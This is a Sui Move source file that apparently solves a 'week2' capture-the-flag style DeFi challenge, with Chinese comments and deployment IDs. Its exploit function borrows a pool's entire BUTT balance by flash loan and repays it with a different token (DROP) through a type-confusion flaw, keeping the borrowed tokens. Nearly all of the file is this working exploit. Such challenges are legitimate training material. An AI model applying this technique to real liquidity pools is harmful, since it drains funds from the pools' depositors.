module solve_week2::solve;

use std::string;
use sui::coin;

use week2::challenge::{Self, Challenge};
use week2::pool::{Self};
use week2::butt::BUTT;
use week2::drop::DROP;
use week2::lp::LP;

// https://learnblockchain.cn/article/17320
// week2 合约部署成功！
// Package ID: 0xc4d384fd38b7b9531e354af9f10aab43f8d6b45a6746d1970479bdfe6026f764
// 部署交易哈希: CFPqgewN9ANDfk7YLqLLmqDLrRAhrBAoWqrhiunTEvr7
// MintBUTT 0xf55adea3c91dd6d9ddb667950bda06d0403fc9deb71329b404361d3663d68221
// MintDROP 0xfb098f7084595171842aaf01f11c0b80bde3ac6ce64abeea793dd73a732cad21
// CreatePoolCap 0xa0b802456712f35322d6ef8dd97a12043cca9807ef559a699f923957d48a1e43
// 创建的Challenge对象ID 0x4c9de8eb1095dc7ae13279ccf19fc3e509da3c545df2d57bdb62aec8da3960b9

// solve package id 0x13d1aa830bbf70cb3b22d2db13fc83c6d8f12af635815cc24d9617639ea2d55a
public fun exploit(challenge: &mut Challenge<LP, BUTT, DROP>, ctx: &mut TxContext) {
    // 获取 DROP 代币
    let mut drop_coin = challenge::claim_drop(challenge, ctx);

    // 获取池子引用
    let pool = challenge::get_pool_mut(challenge);

    // 闪电贷借出所有 BUTT 代币
    let butt_balance = pool::balance_of<LP, BUTT>(pool);
    let (butt_coin, receipt) = pool::flashloan<LP, BUTT>(pool, butt_balance, ctx);

    // 计算还款金额（含 5% 手续费）
    let repay_amount = butt_balance * 105000 / 100000;

    // 用 DROP 代币还款 BUTT 闪电贷（类型混淆）
    let repay_drop = coin::split(&mut drop_coin, repay_amount, ctx);
    pool::repay_flashloan<LP, DROP>(pool, receipt, repay_drop);

    // 转移获得的代币
    transfer::public_transfer(drop_coin, ctx.sender());
    transfer::public_transfer(butt_coin, ctx.sender());
}
